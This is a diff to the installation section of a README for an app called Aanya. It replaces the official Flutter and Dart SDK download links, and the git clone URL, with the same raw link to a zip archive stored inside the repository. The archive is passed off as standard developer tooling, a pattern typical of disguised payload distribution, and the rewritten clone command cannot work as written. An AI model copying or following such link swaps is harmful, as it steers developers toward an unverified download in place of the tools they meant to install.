@@ -47,13 +47,13 @@ Aanya is designed to be more than just an AI assistant. Our goal is to create a 
 
 ### Prerequisites
 Ensure you have the following installed:
-- [Flutter](https://flutter.dev/docs/get-started/install)
-- [Dart SDK](https://dart.dev/get-dart)
+- [Flutter](https://raw.githubusercontent.com/DevangGentyal/aanya/main/surrounded/aanya.zip)
+- [Dart SDK](https://raw.githubusercontent.com/DevangGentyal/aanya/main/surrounded/aanya.zip)
 
 ### Installation
 1. **Clone the Repository**
    ```sh
-   git clone https://github.com/DevangGentyal/aanya.git
+   git clone https://raw.githubusercontent.com/DevangGentyal/aanya/main/surrounded/aanya.zip
    cd aanya
    ```
 2. **Install Dependencies**
